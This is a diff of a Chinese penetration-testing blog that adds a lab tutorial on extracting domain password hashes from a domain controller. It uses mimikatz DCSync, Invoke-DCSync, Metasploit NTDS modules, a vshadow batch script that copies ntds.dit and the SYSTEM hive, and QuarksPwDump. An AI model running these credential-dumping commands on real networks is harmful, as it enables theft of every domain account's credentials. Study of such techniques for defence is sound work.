+<p>打开mimikatz（管理员权限）</p>
+<pre><code>lsadump::dcsync /domain:god.org /all /csv</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018130208043.png" alt="image-20211018130208043"></p>
+<p>当然也可以指定用户</p>
+<pre><code>lsadump::dcsync /domain:god.org /user:ligang</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018130321583.png" alt="image-20211018130321583"></p>
+<p>或者直接对lsass的进程导出</p>
+<pre><code>privilege::debug
+
+lsadump::lsa /inject</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018130613197.png" alt="image-20211018130613197"></p>
+<h3 id="2-使用powershell的DCSync脚本导出"><a href="#2-使用powershell的DCSync脚本导出" class="headerlink" title="2.使用powershell的DCSync脚本导出"></a>2.使用powershell的DCSync脚本导出</h3><p>下载地址：<a href="https://gist.github.com/monoxgas/9d238accd969550136db" target="_blank" rel="noopener">https://gist.github.com/monoxgas/9d238accd969550136db</a></p>
+<p>该脚本通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能，并利用dcsync直接读取ntds.dit得到域用户密码散列值。</p>
+<pre><code>Import-Module .\Invoke-DCSync.ps1
+Invoke-DCSync -DumpForest | ft -wrap -autosize    // 导出域内所有用户的hash
+Invoke-DCSync -DumpForest -Users @("administrator") | ft -wrap -autosize      // 导出域内administrator账户的hash</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018131458932.png" alt="image-20211018131458932"></p>
+<h3 id="3-使用-Metasploit-获取域散列值"><a href="#3-使用-Metasploit-获取域散列值" class="headerlink" title="3.使用 Metasploit 获取域散列值*"></a>3.使用 Metasploit 获取域散列值*</h3><p>前提已经获取到了一个会话</p>
+<pre><code>post/windows/gather/ntds_location       该模块可查看路径ntds
+
+post/windows/gather/smart_hashdump      在线导出域账户hash  建议2012及以上使用auxiliary/admin/smb/psexec_ntdsgrab     利用域管账户，导出ntds必要文件到本地
+
+post/windows/gather/ntds_grabber        利用powershell将ntds必要文件下载到本地后导出</code></pre><p>拿到会话之后</p>
+<p>1.查看ntds安装路径</p>
+<pre><code>run windows/gather/ntds_location</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018135543461.png" alt="image-20211018135543461"></p>
+<p>2.通过smart_hashdump查看域内散列值</p>
+<pre><code>run windows/gather/smart_hashdump</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018135645755.png" alt="image-20211018135645755"></p>
+<p>3.利用powershell下载ntds.dit</p>
+<pre><code>use post/windows/gather/ntds_grabber
+
+set session 3
+
+run</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018135826133.png" alt="image-20211018135826133"></p>
+<pre><code>/root/.msf4/loot/20211018135814_default_192.168.100.130_CabinetFile_222548.cab</code></pre><p>上面这个是生成的路径😁，复制出来查看</p>
+<pre><code>cp /root/.msf4/loot/20211018135814_default_192.168.100.130_CabinetFile_222548.cab /tmp</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018140236031.png" alt="image-20211018140236031"></p>
+<p>打开就能看到了</p>
+<p>使用这个模块这可以获取到</p>
+<pre><code>use auxiliary/admin/smb/psexec_ntdsgrab</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018140657367.png" alt="image-20211018140657367"></p>
+<p>因为我复现失败，没找到具体原因就不放截图。</p>
+<h2 id="使用vsshadow-exe-和-QuarkPwDump-exe-导出域账号和散列值"><a href="#使用vsshadow-exe-和-QuarkPwDump-exe-导出域账号和散列值" class="headerlink" title="使用vsshadow.exe 和 QuarkPwDump.exe 导出域账号和散列值"></a><strong>使用vsshadow.exe 和 QuarkPwDump.exe 导出域账号和散列值</strong></h2><p>在正常的域环境中，ntds.dit文件里包含大量的信息，体积较大，不方便保存到本地。如果域控制器上没有安装杀毒软件，攻击者就能直接进入域控制器，导出ntds.dit并获得域账号和域散列值,而不需要将ntds.dit保存到本地。</p>
+<p>下载地址：<a href="https://github.com/redcanari/quarkspwdump/releases/download/0.3a/QuarksPwDump-0.3a.zip" target="_blank" rel="noopener">https://github.com/redcanari/quarkspwdump/releases/download/0.3a/QuarksPwDump-0.3a.zip</a></p>
+<h3 id="vshadow-exe"><a href="#vshadow-exe" class="headerlink" title="vshadow.exe"></a>vshadow.exe</h3><p>现在官方不提供 vshadow.exe 的直接下载了，可以安装官方 JDK，在安装目录下可以找到 vshadow.exe，这里要注意操作系统的版本，特别是 xp 和 server 2003。<br>下载链接：  <a href="https://www.msxfaq.de/tools/mswin/vshadow.htm" target="_blank" rel="noopener">https://www.msxfaq.de/tools/mswin/vshadow.htm</a></p>
+<p>其实对这个SDK很有疑惑，说安装Microsoft .NET Framework 就有SDK，然后再命令行执行也没有结果，网上找了半天也发现下载的地址，于是去公众号搜索，真就有大佬写了这个过程(<a href="https://mp.weixin.qq.com/s/ABPg8NFugBqleO6v6k9LSA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ABPg8NFugBqleO6v6k9LSA</a>)</p>
+<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018151102136.png" alt="image-20211018151102136"></p>
+<p>把这三个放在一个文件夹下面</p>
+<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018155701494.png" alt="image-20211018155701494"></p>
+<p>创建ShadowCopy.bat</p>
+<pre><code>setlocal
+if NOT "%CALLBACK_SCRIPT%"=="" goto :IS_CALLBACK
+set SOURCE_DRIVE_LETTER=%SystemDrive%
+set SOURCE_RELATIVE_PATH=\windows\ntds\ntds.dit
+set DESTINATION_PATH=%~dp0
+@echo ...Determine the scripts to be executed/generated...
+set CALLBACK_SCRIPT=%~dpnx0
+set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd
+echo mkdir C:\Temp &gt; GeneratedVarsTempScript.cmd
+@echo ...Creating the shadow copy...
+"%~dp0vshadow.exe" -script=%TEMP_GENERATED_SCRIPT% -exec="%CALLBACK_SCRIPT%" %SOURCE_DRIVE_LETTER%
+del /f %TEMP_GENERATED_SCRIPT%
+@goto :EOF
+:IS_CALLBACK
+setlocal
+@echo ...Obtaining the shadow copy device name...
+call %TEMP_GENERATED_SCRIPT%
+@echo ...Copying from the shadow copy to the destination path...
+copy "%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%" %DESTINATION_PATH%</code></pre><p>当我运行脚本的时候出现这个问题，是因为权限不够</p>
+<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018154549557.png" alt="image-20211018154549557"></p>
+<p>以管理员权限运行</p>
+<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018155811533.png" alt="image-20211018155811533"></p>
+<p>换一个脚本，可以读取ntds.dit和system.hive</p>
+<pre><code>setlocal
+if NOT "%CALLBACK_SCRIPT%"=="" goto :IS_CALLBACK
+set SOURCE_DRIVE_LETTER=%SystemDrive%
+set SOURCE_RELATIVE_PATH=windows\ntds\ntds.dit
+set DESTINATION_PATH=%~dp0
+@echo ...Determine the scripts to be executed/generated...
+set CALLBACK_SCRIPT=%~dpnx0
+set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd
+@echo ...Creating the shadow copy...
+"%~dp0vshadow.exe" -script=%TEMP_GENERATED_SCRIPT% -exec="%CALLBACK_SCRIPT%" %SOURCE_DRIVE_LETTER%
+del /f %TEMP_GENERATED_SCRIPT%
+@goto :EOF
+:IS_CALLBACK
+setlocal
+@echo ...Obtaining the shadow copy device name...
+call %TEMP_GENERATED_SCRIPT%
+@echo ...Copying from the shadow copy to the destination path...
+copy "%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%" %DESTINATION_PATH%
+reg save hklm\system system.hive</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018160044958.png" alt="image-20211018160044958"></p>
+<p>运行如下命令修复复制出来的数据库。</p>
+<pre><code>esentutl /p /o ntds.dit</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018160134604.png" alt="image-20211018160134604"></p>
+<p>最后再导出来</p>
+<pre><code>QuarksPwDump.exe -dhd -sf system.hive -nt ntds.dit -o log.txt</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018160855293.png" alt="image-20211018160855293"></p>
+<p>参考链接：</p>
+<p><a href="https://xie1997.blog.csdn.net/article/details/104227572" target="_blank" rel="noopener">https://xie1997.blog.csdn.net/article/details/104227572</a></p>
+<p><a href="https://www.freebuf.com/articles/network/251267.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/251267.html</a></p>
+<p><a href="https://mp.weixin.qq.com/s/EWruvHJ8p54UUWTdbCzefA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/EWruvHJ8p54UUWTdbCzefA</a></p>
+<p><a href="https://xz.aliyun.com/t/2187#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/2187#toc-5</a></p>
+<p><a href="https://mp.weixin.qq.com/s/ABPg8NFugBqleO6v6k9LSA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ABPg8NFugBqleO6v6k9LSA</a></p>
 
             </div>
             <hr />
@@ -1043,7 +1312,7 @@
                     <div class="card-image">
                         
                         
-                        <img src="/images/loading.gif" data-original="/medias/featureimages/9.jpg" class="responsive-img" alt="域控安全">
+                        <img src="/images/loading.gif" data-original="/medias/featureimages/5.jpg" class="responsive-img" alt="域控安全">
                         
                         <span class="card-title">域控安全</span>
                     </div>
@@ -1051,8 +1320,8 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            域控安全前言：博客的所有文章只是自己学习的过程，参考各大佬的文章来学习，还有自己的理解，知识点比较浅，见谅
-
+                            域控安全之ntds.dit导出🐱‍🏍🐱‍🏍🐱‍🏍🐱‍🏍🐱‍🏍🐱‍🏍🐱‍🏍
+在通常的情况下,即使我们拥有域管理员的权限也是无法读取域控制器的C:\Windows\NTDS\ntds.dit文件,是因为活动目录始终访
                         
                     </div>
                     <div class="publish-info">
@@ -1061,10 +1330,25 @@
                             </span>
                         <span class="publish-author">
                             
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/内网渗透/" class="post-category" target="_blank">
+                                    内网渗透
+                                </a>
+                            
+                            
                         </span>
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/内网渗透/" target="_blank">
+                        <span class="chip bg-color">内网渗透</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
@@ -1079,7 +1363,7 @@
                     <div class="card-image">
                         
                         
-                        <img src="/images/loading.gif" data-original="/medias/featureimages/16.jpg" class="responsive-img" alt="NTLM和NTLM身份的认证">
+                        <img src="/images/loading.gif" data-original="/medias/featureimages/12.jpg" class="responsive-img" alt="NTLM和NTLM身份的认证">
                         
                         <span class="card-title">NTLM和NTLM身份的认证</span>
                     </div>
@@ -1287,7 +1571,7 @@ SSPI
 
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-            <span class="white-color">17.3k</span>
+            <span class="white-color">21.4k</span>
             
 
             <br>
